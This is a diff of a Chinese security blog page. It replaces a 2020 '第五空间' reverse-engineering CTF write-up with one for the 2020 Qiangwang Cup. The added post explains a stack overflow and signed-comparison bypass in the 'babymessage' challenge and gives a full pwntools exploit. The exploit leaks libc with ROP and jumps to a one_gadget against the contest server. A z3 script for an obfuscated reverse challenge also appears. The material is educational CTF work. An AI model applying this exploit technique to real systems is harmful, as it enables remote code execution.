@@ -13,11 +13,11 @@
 
     <title>
         
-          2020 “第五空间”智能安全大赛初赛两道 RE 解题报告（writeup） - Goulash
+          2020 第四届强网杯解题报告（writeup） - Goulash
         
     </title>
 
-    <link rel="canonical" href="https://hx1997.github.io/2020/06/25/5space-2020-re-writeup/">
+    <link rel="canonical" href="https://hx1997.github.io/2020/08/24/2020-qwb-writeup/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -190,12 +190,12 @@
                           <a class="tag" href="/tags/#信息安全" title="信息安全">信息安全</a>
                         
                     </div>
-                    <h1>2020 “第五空间”智能安全大赛初赛两道 RE 解题报告（writeup）</h1>
+                    <h1>2020 第四届强网杯解题报告（writeup）</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by HX on
-                        2020-06-25 | 
-                        <span id="/2020/06/25/5space-2020-re-writeup/" class="leancloud-visitors" data-flag-title="文章阅读量统计">
+                        2020-08-24 | 
+                        <span id="/2020/08/24/2020-qwb-writeup/" class="leancloud-visitors" data-flag-title="文章阅读量统计">
                             <span class="pre-meta-item-text">👓 </span>
                             <span class="leancloud-visitors-count"></span>
                             <span class="post-meta-item-text"> views</span>
@@ -218,116 +218,45 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h3 id="x0.-nop-127pt">0x0. nop-127pt</h3>
-<p>这题主要考察的是 Linux 下的反调试技巧。</p>
-<p>先运行观察下行为，提示输入 flag，随便输入后程序退出。</p>
-<p>拖进 IDA 看代码，<code>main</code> 函数一上来进入 <code>sub_804865B</code>，这是第一处反调试。</p>
+                <h3 id="x0.-前言">0x0. 前言</h3>
+<p>只做出两道水题，还是记录一下吧。</p>
+<h3 id="x1.-强网先锋pwn---babymessage---52pt">0x1. 强网先锋（Pwn） - babymessage - 52pt</h3>
+<p>菜单选 1 输入 name，选 2 输入 message。message 的长度由栈上变量 <code>v1</code> 决定，与 256 做有符号比较，大于的话长度设为 256，然后用此长度调用 <code>leave_message</code>。</p>
 <div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcTc6.png">
-
-</div>
-<p>Linux 下，程序无调试器运行时，环境变量_会是程序自身路径，有调试器时，这个环境变量会被调试器改变，可以据此区分程序是否被调试。</p>
-<p>回到 <code>main</code>，把下图两条指令 <code>nop</code> 掉，去掉这个反调试。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBc4hR.png">
-
-</div>
-<p>接着，程序提示输入 flag，将其作为整数存入全局变量 <code>dword_804A038</code>。在块 <code>loc_80486E7</code> 和 <code>loc_80486F5</code> 中，将其值加 1 并存回。</p>
-<p>块 <code>loc_80486F5</code> 中调用函数 <code>sub_804857B</code>，这是第二处反调试。函数中，首先布置好系统调用所需的参数和调用号。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBco1x.png">
-
-</div>
-<p>然后跳到 <code>loc_80485A0</code> 进行系统调用。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcI91.png">
-
-</div>
-<p>查表知 Linux x86 的系统调用号 0x20 是 <code>ptrace</code>，这个系统调用以 C 语言写出相当于 <code>ptrace(0,0,1,0);</code> 这是个典型的反调试。在上图中，根据 <code>ptrace</code> 的返回值决定是否进入错误的分支。将 <code>jl short loc_80485AE</code> 这条指令 <code>nop</code> 掉，去掉这个反调试。</p>
-<p>回到 <code>main</code>，在块 <code>loc_804870D</code> 和 <code>loc_8048701</code> 中，再次将全局变量 <code>dword_804A038</code> 加 1 并存回。接着调用 <code>sub_80485C4</code>，在此函数中布置系统调用号 0x14，然后跳到 <code>loc_80485F8</code> 进行系统调用，相当于 C 语言 <code>getpid();</code>，作用是获取当前进程 PID。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBchN9.png">
+<img src="https://s1.ax1x.com/2020/08/25/dyoxds.png">
 
 </div>
 <div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcbnO.png">
+<img src="https://s1.ax1x.com/2020/08/25/dyozon.png">
 
 </div>
-<p>同时 <code>loc_80485F8</code> 还布置了下一个系统调用号 0x40，接着，跳到 <code>loc_804860B</code> 进行系统调用，相当于 C 语言 <code>getppid();</code>，作用是获取父进程 PID。</p>
+<p>第一次循环，<code>v1</code>（不是 <code>leave_message</code> 那个）一开始是 16，但 <code>leave_message</code> 中 <code>v3</code> 的长度是 8，造成栈溢出，可以覆盖旧的 rbp，从而在函数返回时伪造 rbp 为任意值。</p>
 <div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcqBD.png">
+<img src="https://s1.ax1x.com/2020/08/25/dyoXLQ.png">
 
 </div>
-<p>同时 <code>loc_804860B</code> 还布置了下一个系统调用号 0x93，接着，跳到 <code>loc_804861E</code> 进行系统调用，参数是刚才获取的当前进程 PID，相当于 C 语言 <code>getsid(getpid());</code>，作用是获取当前进程 SID。</p>
+<p>返回后进入第二次循环，因为在 <code>v1</code> 和 256 比较大小时以 rbp 为基准寻址，加上有符号比较存在整数溢出漏洞，所以可以伪造 rbp 使得 rbp-4 处的值是一个负数，从而绕过大小检查，在 <code>leave_message</code> 中 <code>read</code> 时读入超长字符串，控制返回地址。</p>
+<p>先泄露 <code>puts</code> 的地址，用 <code>__libc_csu_init</code> 中的 <code>pop rdi; ret</code> 做 ROP，传递 <code>puts@got</code> 给 <code>puts@plt</code>，以打印出 <code>puts</code> 地址，根据偏移计算出 one_gadget 地址。</p>
+<p>最后返回到 <code>leave_message</code> 函数再触发一次栈溢出，把返回地址改到 one_gadget 就搞定了。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#p = process('./babymessage')</span></div><div class="line">p = remote(<span class="string">'123.56.170.202'</span>,<span class="string">'21342'</span>)</div><div class="line">e = ELF(<span class="string">'./babymessage'</span>)</div><div class="line"></div><div class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</div><div class="line">puts_got = e.got[<span class="string">'puts'</span>]</div><div class="line">poprdi = <span class="number">0x400ac3</span></div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line"></div><div class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</div><div class="line">p.sendlineafter(<span class="string">'name: '</span>, <span class="string">'\xff'</span>*<span class="number">4</span>)</div><div class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</div><div class="line">p.sendlineafter(<span class="string">'message: '</span>, <span class="string">'\xff'</span>*<span class="number">8</span>+p64(<span class="number">0x6010d4</span>))</div><div class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</div><div class="line">payload = <span class="string">'deadbeefdeadbeef'</span></div><div class="line">payload += p64(poprdi) + p64(puts_got) + p64(puts_plt)</div><div class="line">payload += p64(poprdi) + p64(<span class="number">41</span>)</div><div class="line">payload += p64(<span class="number">0x40080a</span>) + <span class="string">'\x00'</span></div><div class="line">p.sendlineafter(<span class="string">'message: '</span>, payload)</div><div class="line">p.recvuntil(<span class="string">'done!\n'</span>)</div><div class="line">p.recv(<span class="number">1</span>)</div><div class="line"></div><div class="line">puts_addr = p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</div><div class="line">puts_addr = u64(puts_addr)</div><div class="line">print(<span class="string">'puts:'</span>+hex(puts_addr))</div><div class="line"></div><div class="line"><span class="comment">#one_shot = puts_addr - 0x3166e</span></div><div class="line">one_shot = puts_addr + <span class="number">0x89a2c</span></div><div class="line"></div><div class="line">print(<span class="string">'one_shot:'</span>+hex(one_shot))</div><div class="line">p.sendlineafter(<span class="string">'message: '</span>, <span class="string">'deadbeefdeadbeef'</span>+p64(one_shot)+<span class="string">'\x00'</span>)</div><div class="line">p.recvuntil(<span class="string">'done!\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<h3 id="x2.-reverse---xx_warmup_obf">0x2. Reverse - xx_warmup_obf</h3>
+<p>控制流平坦化，没有什么好说的，就是跑起来硬跟。</p>
+<p>注册了一个 signal handler，程序中间会通过 <code>int 3</code> 中断进入 handler 里，改变决定着控制流的状态变量中存储的常数。</p>
+<p>一直跟下去，到输入完 flag 后面，这里检验 flag 长度为 1Ch（28）：</p>
 <div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcLHe.png">
+<img src="https://s1.ax1x.com/2020/08/25/dyovZj.png">
 
 </div>
-<p>上图将 <code>getsid(getpid())</code> 与 <code>getppid()</code> 比较，不相等则进入错误分支。将 <code>jnz short loc_8048634</code> 这条指令 <code>nop</code> 掉，去掉这个反调试。</p>
-<p>回到 <code>main</code>，在 <code>loc_8048727</code> 和 <code>loc_804871B</code> 将全局变量 <code>dword_804A038</code> 加上 0xCCCCCCCC 并存回。接着调用 <code>sub_80485C4</code>，即刚才的第二处反调试，因为已经处理，所以不管它，接着往下看。</p>
-<p>在 <code>loc_804873B</code> 中将全局变量 <code>dword_804A038</code> 加 1 并存回，调用 <code>sub_8048753</code>。此函数中又调用 <code>sub_8048691</code>，进入查看。</p>
+<p>接着往下跟，这里取输入的 flag 第一个字符的 ASCII 码，乘以 <code>0x5d75</code>，看是否等于 <code>0x253c9e</code>。</p>
 <div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcXAH.png">
+<img src="https://s1.ax1x.com/2020/08/25/dyTpiq.png">
 
 </div>
-<p><code>sub_8048691</code> 的功能是把 <code>eax</code> 所指向的内存地址存储的字节替换为 0x90（即 <code>nop</code> 指令）。前面操作全局变量 <code>dword_804A038</code> 时以 <code>eax</code> 为中介，所以 <code>eax</code> 里现在存的就是 <code>dword_804A038</code> 的值。但是这个函数有什么意义呢？现在还不清楚，先接着往后看。</p>
-<p>回到 <code>sub_8048753</code>，将 <code>eax</code> 加 1 后再次调用 <code>sub_8048691</code>。所以，这一块代码应该是把内存某个位置连续的两个字节 <code>nop</code> 掉了。</p>
-<p>接着，程序直接跳入了错误分支，与此同时 IDA 中可以看到正确分支就在附近，且如果不经过 0x8048765 处的 <code>jmp</code>，就可以进入正确分支。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcz9I.png">
-
-</div>
-<p>这时就明白了上面 <code>sub_8048691</code> 的功能，它给了我们 <code>nop</code> 掉 0x8048765 的 <code>jmp</code> 的能力，这个 <code>jmp</code> 正好占两字节。</p>
-<p>到此，程序就分析完了。流程整理如下（不考虑反调试）：</p>
-<ol style="list-style-type: decimal">
-<li><p>输入 flag，为一个整数</p></li>
-<li><p>将 flag+1</p></li>
-<li><p>将 flag+1</p></li>
-<li><p>将 flag+0xCCCCCCCC</p></li>
-<li><p>将 flag+1</p></li>
-<li><p>将 flag 所指向的内存地址连续的两字节 <code>nop</code> 掉</p></li>
-</ol>
-<p>我们希望把 0x8048765 的 <code>jmp</code> 替换为 <code>nop</code>，所以可以列出方程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag+0xCCCCCCCF==0x8048765</div></pre></td></tr></table></figure>
-<p>注意是对 32 位整数运算，所以结果要对 0x1 0000 0000 取模。解得 flag 为 0x3B37BA96 ，即十进制 993507990。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcv4A.png">
-
-</div>
-<p>最后按 flag 格式，提交 <span class="math display">\[
-flag\{993507990\}
-\]</span></p>
-<h3 id="x1.-逆向-rev-232pt">0x1. 逆向-rev-232pt</h3>
-<p>涉及指令 gadget 的题，本来这种技术在 pwn 里很常见，现在搬到了 re 里…</p>
-<p>先看 <code>main</code>，很简单，要求两个参数，然后 <code>sub_400D19</code> 验证第二个参数，返回值为 1 则正确。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBcjNd.png">
-
-</div>
-<p>重点看 <code>sub_400D19</code>，只有三条指令，将变量 <code>data</code> 的地址传送给 <code>rsp</code>，然后返回到这个地址。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBgS3t.png">
-
-</div>
-<p>显然 <code>data</code> 是代码了，进去看。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBgpgP.png">
-
-</div>
-<p>这里有许多指针，每个都指向一个 gadget，依次执行这些 gadget 进行运算，最后产生结果。</p>
-<p>因为指令被打散成 gadget，分析起来很麻烦，再加上这种进行一堆运算，最后根据返回值进入正确或错误分支的题一般可以尝试下走捷径，所以先偷懒试下符号执行。</p>
-<p>IDA 里看到正确分支在 0x400481，编写 angr 脚本如下。之所以知道 flag 是 21 位，是因为换题目之前的旧题里透露了 flag 位数，定长一点也行，angr 一样能解出来。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBgiDS.png">
-
-</div>
-<p>运行，等几秒就得到 flag 了。</p>
-<div class="figure">
-<img src="https://s1.ax1x.com/2020/06/25/NBg9jf.png">
-
-</div>
-<h3 id="x2.-总结">0x2. 总结</h3>
-<p>太菜了，twice 那题栈溢出都没做出来… 另外等一个 rev 正经解法的 writeup。</p>
+<p>所以第一个字符就是 <code>0x253c9e</code> 除以 <code>0x5d75</code> 等于 <code>0x66</code>，即 f，可以猜测前面几个字符是 flag{。</p>
+<p>后面的计算也和这里类似，用输入的 flag 里某几位字符乘以一个数，得数全部加起来再判断是否等于某个常数，每次计算可以确定出 flag 里的一个字符，全部 28 个字符算出来就是 flag。</p>
+<p>解方程用 z3，不过因为每次乘以的数都不同，也不知道有什么好办法自动解每一个字符（看了别的师傅的 writeup，可以写 IDAPython 脚本，需要学习一个），所以只能用笨办法每个字符重新写 z3 脚本算…… 以下是算中间某个字符的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line">sys.path.append(<span class="string">'z3/build/'</span>)</div><div class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</div><div class="line"></div><div class="line">s = Solver()</div><div class="line"></div><div class="line">a = BitVec(<span class="string">'a'</span>, <span class="number">32</span>)</div><div class="line"></div><div class="line">flag = <span class="string">'flag&#123;g0_Fuck_xx_5e'</span></div><div class="line">s.add(a*<span class="number">0xFFFC5AF3</span></div><div class="line">	+ord(flag[<span class="number">0</span>])*<span class="number">0x20d94</span></div><div class="line">	+ord(flag[<span class="number">1</span>])*<span class="number">0x2fb77</span></div><div class="line">	+ord(flag[<span class="number">2</span>])*<span class="number">0xFFFD2918</span></div><div class="line">	+ord(flag[<span class="number">3</span>])*<span class="number">0x1882d</span></div><div class="line">	+ord(flag[<span class="number">4</span>])*<span class="number">0xFFFEDE1F</span></div><div class="line">	+ord(flag[<span class="number">5</span>])*<span class="number">0xFFFF0015</span></div><div class="line">	+ord(flag[<span class="number">6</span>])*<span class="number">0xFFFBB7A0</span></div><div class="line">	+ord(flag[<span class="number">7</span>])*<span class="number">0x14a94</span></div><div class="line">	+ord(flag[<span class="number">8</span>])*<span class="number">0xFFFDA0CD</span></div><div class="line">	+ord(flag[<span class="number">9</span>])*<span class="number">0xde69</span></div><div class="line">	+ord(flag[<span class="number">0xa</span>])*<span class="number">0x2FE8</span></div><div class="line">	+ord(flag[<span class="number">0xb</span>])*<span class="number">0x2abe5</span></div><div class="line">	+ord(flag[<span class="number">0xc</span>])*<span class="number">0x26530</span></div><div class="line">	+ord(flag[<span class="number">0xd</span>])*<span class="number">0x4c3d</span></div><div class="line">	+ord(flag[<span class="number">0xe</span>])*<span class="number">0x2383e</span></div><div class="line">	+ord(flag[<span class="number">0xf</span>])*<span class="number">0x42763</span></div><div class="line">	+ord(flag[<span class="number">0x10</span>])*<span class="number">0xe5c9</span></div><div class="line">	+ord(flag[<span class="number">0x11</span>])*<span class="number">0x539</span></div><div class="line">	==<span class="number">0x39F3331</span>)</div><div class="line">s.add(a&gt;<span class="number">0</span>)</div><div class="line">s.add(a&lt;<span class="number">0x100</span>)</div><div class="line"></div><div class="line">print(s.check())</div><div class="line">mod = s.model()</div><div class="line"></div><div class="line">chars = [</div><div class="line">          mod[a],</div><div class="line">        ]</div><div class="line"></div><div class="line">print(chars)</div></pre></td></tr></table></figure>
 
 
                 <hr>
@@ -336,13 +265,9 @@ flag\{993507990\}
 
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2020/08/17/linear-algebra-done-right-ch3-problem-solutions/" data-toggle="tooltip" data-placement="top" title="《线性代数应该这样学》第 3 章习题选做（草稿）">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2019/05/28/qwb-2019-ctf-writeup/" data-toggle="tooltip" data-placement="top" title="2019 第三届强网杯解题报告（writeup）">Next Post &rarr;</a>
+                            <a href="/2020/08/17/linear-algebra-done-right-ch3-problem-solutions/" data-toggle="tooltip" data-placement="top" title="《线性代数应该这样学》第 3 章习题选做（草稿）">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
